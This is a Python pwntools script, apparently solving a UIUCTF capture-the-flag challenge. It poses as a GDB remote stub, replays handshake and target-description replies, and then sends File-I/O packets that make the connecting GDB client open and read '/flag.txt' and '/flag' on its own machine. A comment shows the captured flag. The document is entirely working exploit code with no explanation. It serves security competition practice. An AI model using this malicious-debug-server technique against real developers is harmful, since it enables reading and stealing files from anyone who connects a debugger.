from pwn import *

def csum(pd):
    l = 0
    for i in range(len(pd)):
        l += pd[i]
    return (hex(l % 256)[2:]).encode().rjust(2,b'0')

def gdbrecv():
    c = p.recvuntil('#')
    c += p.recv(2)
    print(c)
    return c

def gdbsend(reply,ack=0):
    x = b''
    if ack:
        x += b'+'
    x += b'$%s#%s'%(reply,csum(reply))
    p.send(x)

p = remote('chal.uiuc.tf', 2002)

gdbrecv()
gdbsend(b'PacketSize=3fff;QPassSignals+;QProgramSignals+;qXfer:libraries-svr4:read+;augmented-libraries-svr4-read+;qXfer:auxv:read+;qXfer:spu:read+;qXfer:spu:write+;qXfer:siginfo:read+;qXfer:siginfo:write+;qXfer:features:read+;QStartNoAckMode+;qXfer:osdata:read+;multiprocess+;QNonStop+;QDisableRandomization+;qXfer:threads:read+;ConditionalTracepoints+;TraceStateVariables+;TracepointSource+;DisconnectedTracing+;FastTracepoints+;StaticTracepoints+;InstallInTrace+;qXfer:statictrace:read+;qXfer:traceframe-info:read+;EnableDisableTracepoints+;QTBuffer:size+;tracenz+;ConditionalBreakpoints+;BreakpointCommands+;QAgent+',1)

gdbrecv()
gdbsend(b'OK',1)

gdbrecv()
gdbsend(b'OK',1)

gdbrecv()
gdbsend(b'OK',1)

gdbrecv()
gdbsend(b'l<?xml version="1.0"?>\n<!-- Copyright (C) 2010-2014 Free Software Foundation, Inc.\n\n     Copying and distribution of this file, with or without modification,\n     are permitted in any medium without royalty provided the copyright\n     notice and this notice are preserved.  -->\n\n<!-- AMD64 with AVX - Includes Linux-only special "register".  -->\n\n<!DOCTYPE target SYSTEM "gdb-target.dtd">\n<target>\n  <architecture>i386:x86-64</architecture>\n  <osabi>GNU/Linux</osabi>\n  <xi:include href="64bit-core.xml"/>\n  <xi:include href="64bit-sse.xml"/>\n  <xi:include href="64bit-linux.xml"/>\n  <xi:include href="64bit-avx.xml"/>\n</target>\n',1)

gdbrecv()
gdbsend(b"""l<?xml version="1.0"?>\n<!-- Copyright (C) 2010-2014 Free Software Foundation, Inc.\n\n     Copying and distribution of this file, with or without modification,\n     are permitted in any medium without royalty provided the copyright\n     notice and this notice are preserved.  -->\n\n<!DOCTYPE feature SYSTEM "gdb-target.dtd">\n<feature name="org.gnu.gdb.i386.core">\n  <flags id="i386_eflags" size="4">\n    <field name="CF" start="0" end="0"/>\n    <field name="" start="1" end="1"/>\n    <field name="PF" start="2" end="2"/>\n    <field name="AF" start="4" end="4"/>\n    <field name="ZF" start="6" end="6"/>\n    <field name="SF" start="7" end="7"/>\n    <field name="TF" start="8" end="8"/>\n    <field name="IF" start="9" end="9"/>\n    <field name="DF" start="10" end="10"/>\n    <field name="OF" start="11" end="11"/>\n    <field name="NT" start="14" end="14"/>\n    <field name="RF" start="16" end="16"/>\n    <field name="VM" start="17" end="17"/>\n    <field name="AC" start="18" end="18"/>\n    <field name="VIF" start="19" end="19"/>\n    <field name="VIP" start="20" end="20"/>\n    <field name="ID" start="21" end="21"/>\n  </flags>\n\n  <reg name="rax" bitsize="64" type="int64"/>\n  <reg name="rbx" bitsize="64" type="int64"/>\n  <reg name="rcx" bitsize="64" type="int64"/>\n  <reg name="rdx" bitsize="64" type="int64"/>\n  <reg name="rsi" bitsize="64" type="int64"/>\n  <reg name="rdi" bitsize="64" type="int64"/>\n  <reg name="rbp" bitsize="64" type="data_ptr"/>\n  <reg name="rsp" bitsize="64" type="data_ptr"/>\n  <reg name="r8" bitsize="64" type="int64"/>\n  <reg name="r9" bitsize="64" type="int64"/>\n  <reg name="r10" bitsize="64" type="int64"/>\n  <reg name="r11" bitsize="64" type="int64"/>\n  <reg name="r12" bitsize="64" type="int64"/>\n  <reg name="r13" bitsize="64" type="int64"/>\n  <reg name="r14" bitsize="64" type="int64"/>\n  <reg name="r15" bitsize="64" type="int64"/>\n\n  <reg name="rip" bitsize="64" type="code_ptr"/>\n  <reg name="eflags" bitsize="32" type="i386_eflags"/>\n  <reg name="cs" bitsize="32" type="int32"/>\n  <reg name="ss" bitsize="32" type="int32"/>\n  <reg name="ds" bitsize="32" type="int32"/>\n  <reg name="es" bitsize="32" type="int32"/>\n  <reg name="fs" bitsize="32" type="int32"/>\n  <reg name="gs" bitsize="32" type="int32"/>\n\n  <reg name="st0" bitsize="80" type="i387_ext"/>\n  <reg name="st1" bitsize="80" type="i387_ext"/>\n  <reg name="st2" bitsize="80" type="i387_ext"/>\n  <reg name="st3" bitsize="80" type="i387_ext"/>\n  <reg name="st4" bitsize="80" type="i387_ext"/>\n  <reg name="st5" bitsize="80" type="i387_ext"/>\n  <reg name="st6" bitsize="80" type="i387_ext"/>\n  <reg name="st7" bitsize="80" type="i387_ext"/>\n\n  <reg name="fctrl" bitsize="32" type="int" group="float"/>\n  <reg name="fstat" bitsize="32" type="int" group="float"/>\n  <reg name="ftag" bitsize="32" type="int" group="float"/>\n  <reg name="fiseg" bitsize="32" type="int" group="float"/>\n  <reg name="fioff" bitsize="32" type="int" group="float"/>\n  <reg name="foseg" bitsize="32" type="int" group="float"/>\n  <reg name="fooff" bitsize="32" type="int" group="float"/>\n  <reg name="fop" bitsize="32" type="int" group="float"/>\n</feature>\n""",1)

gdbrecv()
gdbsend(b"""l<?xml version="1.0"?>\n<!-- Copyright (C) 2010-2014 Free Software Foundation, Inc.\n\n     Copying and distribution of this file, with or without modification,\n     are permitted in any medium without royalty provided the copyright\n     notice and this notice are preserved.  -->\n\n<!DOCTYPE feature SYSTEM "gdb-target.dtd">\n<feature name="org.gnu.gdb.i386.sse">\n  <vector id="v4f" type="ieee_single" count="4"/>\n  <vector id="v2d" type="ieee_double" count="2"/>\n  <vector id="v16i8" type="int8" count="16"/>\n  <vector id="v8i16" type="int16" count="8"/>\n  <vector id="v4i32" type="int32" count="4"/>\n  <vector id="v2i64" type="int64" count="2"/>\n  <union id="vec128">\n    <field name="v4_float" type="v4f"/>\n    <field name="v2_double" type="v2d"/>\n    <field name="v16_int8" type="v16i8"/>\n    <field name="v8_int16" type="v8i16"/>\n    <field name="v4_int32" type="v4i32"/>\n    <field name="v2_int64" type="v2i64"/>\n    <field name="uint128" type="uint128"/>\n  </union>\n  <flags id="i386_mxcsr" size="4">\n    <field name="IE" start="0" end="0"/>\n    <field name="DE" start="1" end="1"/>\n    <field name="ZE" start="2" end="2"/>\n    <field name="OE" start="3" end="3"/>\n    <field name="UE" start="4" end="4"/>\n    <field name="PE" start="5" end="5"/>\n    <field name="DAZ" start="6" end="6"/>\n    <field name="IM" start="7" end="7"/>\n    <field name="DM" start="8" end="8"/>\n    <field name="ZM" start="9" end="9"/>\n    <field name="OM" start="10" end="10"/>\n    <field name="UM" start="11" end="11"/>\n    <field name="PM" start="12" end="12"/>\n    <field name="FZ" start="15" end="15"/>\n  </flags>\n\n  <reg name="xmm0" bitsize="128" type="vec128" regnum="40"/>\n  <reg name="xmm1" bitsize="128" type="vec128"/>\n  <reg name="xmm2" bitsize="128" type="vec128"/>\n  <reg name="xmm3" bitsize="128" type="vec128"/>\n  <reg name="xmm4" bitsize="128" type="vec128"/>\n  <reg name="xmm5" bitsize="128" type="vec128"/>\n  <reg name="xmm6" bitsize="128" type="vec128"/>\n  <reg name="xmm7" bitsize="128" type="vec128"/>\n  <reg name="xmm8" bitsize="128" type="vec128"/>\n  <reg name="xmm9" bitsize="128" type="vec128"/>\n  <reg name="xmm10" bitsize="128" type="vec128"/>\n  <reg name="xmm11" bitsize="128" type="vec128"/>\n  <reg name="xmm12" bitsize="128" type="vec128"/>\n  <reg name="xmm13" bitsize="128" type="vec128"/>\n  <reg name="xmm14" bitsize="128" type="vec128"/>\n  <reg name="xmm15" bitsize="128" type="vec128"/>\n\n  <reg name="mxcsr" bitsize="32" type="i386_mxcsr" group="vector"/>\n</feature>\n""",1)

gdbrecv()
gdbsend(b"""l<?xml version="1.0"?>\n<!-- Copyright (C) 2010-2014 Free Software Foundation, Inc.\n\n     Copying and distribution of this file, with or without modification,\n     are permitted in any medium without royalty provided the copyright\n     notice and this notice are preserved.  -->\n\n<!DOCTYPE feature SYSTEM "gdb-target.dtd">\n<feature name="org.gnu.gdb.i386.linux">\n  <reg name="orig_rax" bitsize="64" type="int" regnum="57"/>\n</feature>\n""",1)

gdbrecv()
gdbsend(b"""l<?xml version="1.0"?>\n<!-- Copyright (C) 2010-2014 Free Software Foundation, Inc.\n\n     Copying and distribution of this file, with or without modification,\n     are permitted in any medium without royalty provided the copyright\n     notice and this notice are preserved.  -->\n\n<!DOCTYPE feature SYSTEM "gdb-target.dtd">\n<feature name="org.gnu.gdb.i386.avx">\n  <reg name="ymm0h" bitsize="128" type="uint128"/>\n  <reg name="ymm1h" bitsize="128" type="uint128"/>\n  <reg name="ymm2h" bitsize="128" type="uint128"/>\n  <reg name="ymm3h" bitsize="128" type="uint128"/>\n  <reg name="ymm4h" bitsize="128" type="uint128"/>\n  <reg name="ymm5h" bitsize="128" type="uint128"/>\n  <reg name="ymm6h" bitsize="128" type="uint128"/>\n  <reg name="ymm7h" bitsize="128" type="uint128"/>\n  <reg name="ymm8h" bitsize="128" type="uint128"/>\n  <reg name="ymm9h" bitsize="128" type="uint128"/>\n  <reg name="ymm10h" bitsize="128" type="uint128"/>\n  <reg name="ymm11h" bitsize="128" type="uint128"/>\n  <reg name="ymm12h" bitsize="128" type="uint128"/>\n  <reg name="ymm13h" bitsize="128" type="uint128"/>\n  <reg name="ymm14h" bitsize="128" type="uint128"/>\n  <reg name="ymm15h" bitsize="128" type="uint128"/>\n</feature>\n""",1)

gdbrecv()
gdbsend(b"""l!\000\000\000\000\000\000\000\000qc\177\000\000\020\000\000\000\000\000\000\000\213\237\000\000\000\000\006\000\000\000\000\000\000\000\000\020\000\000\000\000\000\000\021\000\000\000\000\000\000\000d\000\000\000\000\000\000\000\003\000\000\000\000\000\000\000@\000@\000\000\000\000\000\004\000\000\000\000\000\000\0008\000\000\000\000\000\000\000\005\000\000\000\000\000\000\000\t\000\000\000\000\000\000\000\a\000\000\000\000\000\000\000\000\200\030v\177\000\000\b\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\t\000\000\000\000\000\000\000H@\000\000\000\000\000\013\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\f\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\r\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\016\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\027\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\031\000\000\000\000\000\000\000\211\abc\177\000\000\032\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\037\000\000\000\000\000\000\000\017bc\177\000\000\017\000\000\000\000\000\000\000\231\abc\177\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000""",1)

gdbrecv()
gdbsend(b"""OK""",1)

# $?#3f
gdbrecv()
gdbsend(b"""T0;tnotrun:0;tframes:0;tcreated:0;tfree:500000;tsize:500000;circular:0;disconn:0;starttime:0;stoptime:0;username:;notes::""",1)

gdbrecv()
gdbsend(b'1:0:1:74726163655f74696d657374616d70',1)

gdbrecv()
gdbsend(b'l',1)

gdbrecv()
gdbsend(b'Fopen,123456/10,0,100444')
gdbrecv()
gdbsend(b'E01',1)
gdbrecv()
gdbsend(b'1',1)
gdbrecv()
gdbsend(b'1',1)
gdbrecv()
gdbsend(b'Fopen,123456/9,0')
gdbrecv()
gdbsend(b'2f666c61672e74787400')
gdbrecv()
gdbsend(b'2f666c616700')
gdbrecv()
gdbsend(b'Fread,3,1234,30')
# uiuctf{target remote google.com:80}
p.interactive()
